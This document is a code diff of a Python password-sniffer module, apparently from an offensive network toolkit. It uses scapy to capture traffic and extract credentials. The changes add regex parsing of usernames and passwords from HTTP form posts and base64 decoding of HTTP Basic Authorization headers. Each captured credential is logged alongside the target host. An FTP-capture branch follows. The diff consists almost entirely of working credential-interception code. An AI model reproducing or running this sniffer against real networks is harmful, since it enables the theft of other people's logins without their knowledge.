@@ -1,17 +1,18 @@
 import stream
 import util
+from base64 import b64decode
 from sniffer import Sniffer
-from re import findall
+from re import findall,search
 from scapy.all import *
 
-__name__ = "Password Sniffer"
-class PasswordSniffer(Sniffer):
+class password_sniffer(Sniffer):
 	""" Sniff and parse passwords from various protocols """
 	def __init__(self):
-		super(PasswordSniffer, self).__init__('Password')
+		super(password_sniffer, self).__init__('Password Sniffer')
 
 	def initialize(self):
 		""" initialize sniffer """
+		self.get_ip()
 		tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '%self.source)
 		if 'n' in tmp.lower():
 			return None
@@ -28,7 +29,16 @@ class PasswordSniffer(Sniffer):
 			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
 				payload = pkt.getlayer(Raw).load
 				if 'username' in payload or 'password' in payload:
-					self.log_msg(str(payload))
+					username = re.search('username=(.*?)(&|$| )',payload)
+					password = re.search('password=(.*?)(&|$| )',payload)
+					if username is not None and password is not None:
+						self.log_msg('Host: %s\nUsername: %s\nPassword: %s'%
+										(pkt[IP].dst,username.groups(0)[0],password.groups(0)[0]))
+				elif 'Authorization:' in payload:
+					# such as routers
+					pw = re.search('Authorization: Basic (.*)',payload)
+					if pw.groups(0) is not None:
+						self.log_msg('Authorization to %s: %s'%(pkt[IP].dst,b64decode(pw.groups(0)[0])))
 			# ftp
 			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
 				payload = str(pkt.sprintf("%Raw.load%"))
